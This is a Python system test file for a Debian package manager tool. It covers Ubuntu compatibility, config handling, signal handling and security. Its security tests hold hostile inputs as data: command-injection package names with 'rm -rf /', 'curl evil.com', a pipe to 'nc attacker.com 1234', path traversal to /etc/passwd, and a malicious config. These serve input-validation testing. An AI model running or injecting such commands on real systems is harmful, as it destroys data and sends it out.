#!/usr/bin/env python3
"""
System tests for Debian Package Manager.
These tests verify Ubuntu compatibility and system-level functionality.
"""

import os
import sys
import subprocess
import tempfile
import json
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add src to path for testing
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from debian_metapackage_manager.engine import PackageEngine
from debian_metapackage_manager.cli import PackageManagerCLI


class TestUbuntuCompatibility:
    """Test compatibility across Ubuntu versions."""
    
    def test_ubuntu_version_detection(self):
        """Test Ubuntu version detection."""
        # Mock different Ubuntu versions
        ubuntu_versions = [
            ("18.04", "bionic"),
            ("20.04", "focal"),
            ("22.04", "jammy"),
            ("24.04", "noble")
        ]
        
        for version, codename in ubuntu_versions:
            with patch('platform.platform') as mock_platform:
                mock_platform.return_value = f"Linux-5.4.0-Ubuntu-{version}-generic"
                
                # Test that the system can handle different Ubuntu versions
                engine = PackageEngine()
                
                # Basic functionality should work regardless of version
                assert engine is not None
                assert engine.config is not None
                assert engine.classifier is not None
    
    def test_python_version_compatibility(self):
        """Test Python version compatibility."""
        # Test that we're running on a supported Python version
        assert sys.version_info >= (3, 8), f"Python {sys.version_info} is not supported"
        
        # Test that all imports work
        try:
            from debian_metapackage_manager import models, interfaces, config
            from debian_metapackage_manager import engine, cli
            from debian_metapackage_manager import apt_interface, dpkg_interface
            from debian_metapackage_manager import dependency_resolver, conflict_handler
            from debian_metapackage_manager import mode_manager, classifier
            from debian_metapackage_manager import error_handler
        except ImportError as e:
            assert False, f"Import failed: {e}"
    
    def test_system_dependencies(self):
        """Test system dependency detection."""
        engine = PackageEngine()
        
        # Test that the system can detect missing dependencies gracefully
        with patch('subprocess.run') as mock_run:
            # Simulate missing apt
            mock_run.side_effect = FileNotFoundError()
            
            # The system should handle this gracefully
            try:
                # This might fail, but shouldn't crash
                engine.apt.is_package_available("test-package")
            except Exception:
                # Expected on systems without apt
                pass
    
    def test_file_system_permissions(self):
        """Test file system permission handling."""
        engine = PackageEngine()
        
        # Test config file creation in various scenarios
        temp_dir = tempfile.mkdtemp()
        
        # Test with writable directory
        config_path = os.path.join(temp_dir, "config.json")
        engine.config.config_path = config_path
        
        try:
            engine.config.save_config()
            assert os.path.exists(config_path)
        except Exception as e:
            # Should not fail with writable directory
            assert False, f"Config save failed: {e}"
        
        # Test with read-only directory
        os.chmod(temp_dir, 0o444)
        
        try:
            engine.config.save_config()
            # Should handle read-only gracefully
        except PermissionError:
            # Expected behavior
            pass
        finally:
            # Restore permissions for cleanup
            os.chmod(temp_dir, 0o755)


class TestSystemIntegration:
    """Test system-level integration."""
    
    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.temp_dir, "config.json")
        
        # Create test config
        test_config = {
            "package_prefixes": {
                "custom_prefixes": ["system-test-"]
            },
            "offline_mode": False,
            "version_pinning": {}
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(test_config, f)
    
    def test_cli_system_integration(self):
        """Test CLI system integration."""
        cli = PackageManagerCLI()
        
        # Test that CLI can be instantiated and basic commands work
        with patch.object(cli.engine, 'check_system_health') as mock_health:
            mock_health.return_value = MagicMock(
                success=True,
                warnings=[],
                errors=[]
            )
            
            result = cli.run(['health'])
            assert result == 0
    
    def test_configuration_system_integration(self):
        """Test configuration system integration."""
        engine = PackageEngine(config_path=self.config_file)
        
        # Test that configuration is loaded correctly
        assert engine.config.config_path == self.config_file
        
        # Test configuration persistence
        engine.config.add_custom_prefix("system-integration-")
        engine.config.save_config()
        
        # Create new engine and verify config persisted
        new_engine = PackageEngine(config_path=self.config_file)
        prefixes = new_engine.config.get_custom_prefixes()
        assert "system-integration-" in prefixes
    
    def test_logging_system_integration(self):
        """Test logging system integration."""
        import logging
        
        # Test that logging is configured properly
        logger = logging.getLogger('debian_metapackage_manager')
        
        # Test that we can log without errors
        try:
            logger.info("System integration test log message")
            logger.warning("System integration test warning")
            logger.error("System integration test error")
        except Exception as e:
            assert False, f"Logging failed: {e}"
    
    def test_error_handling_system_integration(self):
        """Test error handling system integration."""
        engine = PackageEngine(config_path=self.config_file)
        
        # Test that errors are handled gracefully at system level
        with patch.object(engine.apt, 'install_package') as mock_install:
            mock_install.side_effect = Exception("System error")
            
            # Should not crash, should return error result
            result = engine.install_package("test-package")
            assert not result.success
            assert len(result.errors) > 0
    
    def test_signal_handling(self):
        """Test signal handling for graceful shutdown."""
        import signal
        import threading
        import time
        
        cli = PackageManagerCLI()
        interrupted = False
        
        def signal_handler(signum, frame):
            nonlocal interrupted
            interrupted = True
        
        # Set up signal handler
        original_handler = signal.signal(signal.SIGINT, signal_handler)
        
        try:
            # Simulate long-running operation
            def long_operation():
                with patch.object(cli.engine, 'install_package') as mock_install:
                    def slow_install(*args, **kwargs):
                        time.sleep(0.5)  # Simulate slow operation
                        return MagicMock(success=True, packages_affected=[], warnings=[], errors=[])
                    
                    mock_install.side_effect = slow_install
                    
                    try:
                        cli.run(['install', 'test-package'])
                    except KeyboardInterrupt:
                        pass
            
            # Start operation in thread
            thread = threading.Thread(target=long_operation)
            thread.start()
            
            # Send interrupt signal after short delay
            time.sleep(0.1)
            os.kill(os.getpid(), signal.SIGINT)
            
            thread.join(timeout=2.0)
            
            # Verify signal was handled
            assert interrupted
            
        finally:
            # Restore original handler
            signal.signal(signal.SIGINT, original_handler)
    
    def test_memory_usage(self):
        """Test memory usage patterns."""
        import gc
        import psutil
        
        # Get initial memory usage
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # Create and use engine multiple times
        for i in range(10):
            engine = PackageEngine(config_path=self.config_file)
            
            # Perform some operations
            with patch.object(engine.apt, 'is_package_available') as mock_available:
                mock_available.return_value = True
                engine.get_package_info(f"test-package-{i}")
            
            # Force garbage collection
            del engine
            gc.collect()
        
        # Check final memory usage
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 50MB)
        assert memory_increase < 50 * 1024 * 1024, f"Memory usage increased by {memory_increase / 1024 / 1024:.2f}MB"


class TestSystemSecurity:
    """Test system security aspects."""
    
    def test_privilege_escalation_protection(self):
        """Test protection against privilege escalation."""
        cli = PackageManagerCLI()
        
        # Test that operations requiring root are properly detected
        with patch('os.geteuid') as mock_geteuid:
            mock_geteuid.return_value = 1000  # Non-root user
            
            # Should warn about privileges but not fail
            result = cli.run(['install', 'test-package'])
            # The warning should be displayed but operation should continue
    
    def test_input_validation(self):
        """Test input validation and sanitization."""
        cli = PackageManagerCLI()
        
        # Test with malicious package names
        malicious_names = [
            "../../../etc/passwd",
            "package; rm -rf /",
            "package && curl evil.com",
            "package | nc attacker.com 1234",
            "$(rm -rf /)",
            "`rm -rf /`"
        ]
        
        for malicious_name in malicious_names:
            with patch.object(cli.engine, 'install_package') as mock_install:
                mock_install.return_value = MagicMock(
                    success=False,
                    packages_affected=[],
                    warnings=[],
                    errors=["Invalid package name"]
                )
                
                # Should handle malicious input safely
                result = cli.run(['install', malicious_name])
                # Should not crash or execute malicious commands
    
    def test_configuration_security(self):
        """Test configuration file security."""
        temp_dir = tempfile.mkdtemp()
        config_file = os.path.join(temp_dir, "config.json")
        
        # Test with malicious configuration
        malicious_config = {
            "package_prefixes": {
                "custom_prefixes": ["../../../", "$(rm -rf /)"]
            },
            "offline_mode": False,
            "version_pinning": {
                "$(malicious)": "1.0.0"
            }
        }
        
        with open(config_file, 'w') as f:
            json.dump(malicious_config, f)
        
        # Should handle malicious config safely
        try:
            engine = PackageEngine(config_path=config_file)
            # Should not execute malicious code
            prefixes = engine.config.get_custom_prefixes()
            # Should sanitize or reject malicious prefixes
        except Exception:
            # Expected to fail safely
            pass


def run_system_tests():
    """Run all system tests."""
    print("Running system tests...")
    
    test_classes = [
        TestUbuntuCompatibility(),
        TestSystemIntegration(),
        TestSystemSecurity()
    ]
    
    passed = 0
    failed = 0
    
    for test_class in test_classes:
        # Get all test methods
        test_methods = [method for method in dir(test_class) if method.startswith('test_')]
        
        for method_name in test_methods:
            try:
                if hasattr(test_class, 'setup_method'):
                    test_class.setup_method()
                
                method = getattr(test_class, method_name)
                method()
                print(f"✓ {test_class.__class__.__name__}.{method_name}")
                passed += 1
            except Exception as e:
                print(f"✗ {test_class.__class__.__name__}.{method_name}: {e}")
                failed += 1
    
    print(f"\nSystem Tests: {passed} passed, {failed} failed")
    return failed == 0


if __name__ == "__main__":
    success = run_system_tests()
    sys.exit(0 if success else 1)